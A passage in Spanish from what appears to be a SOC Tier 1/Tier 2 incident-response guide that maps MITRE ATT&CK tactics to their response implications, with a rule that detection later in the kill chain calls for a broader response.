Persistence       → El atacante sobrevivirá al reinicio; buscar todos los mecanismos
Privilege Escal.  → Evaluar qué puede alcanzar con privilegios elevados
Defense Evasion   → Revisar qué se ha ocultado; puede haber borrado logs
Credential Access → Forzar reset masivo si hay contraseñas comprometidas
Discovery         → Evaluar qué vio y adónde puede ir
Lateral Movement  → El incidente ya no es de un host; escalar a IR completo
Collection        → Identificar qué datos puede haber visto
Exfiltration      → Datos fuera; notificación legal/compliance puede ser obligatoria
Impact            → Daño consumado; activar BCP/DRP
```

> **Regla práctica:** Cuanto más abajo en la Kill Chain, más urgente y más amplia es la respuesta. Detectar en Initial Access es un incidente de un host. Detectar en Lateral Movement es un incidente de red. Detectar en Impact puede ser una crisis corporativa.
> 

---

*Referencia: MITRE ATT&CK · Microsoft Docs · Sysinternals SysmonAudiencia: Analistas SOC Tier 1 / Tier 2, Blue Team*
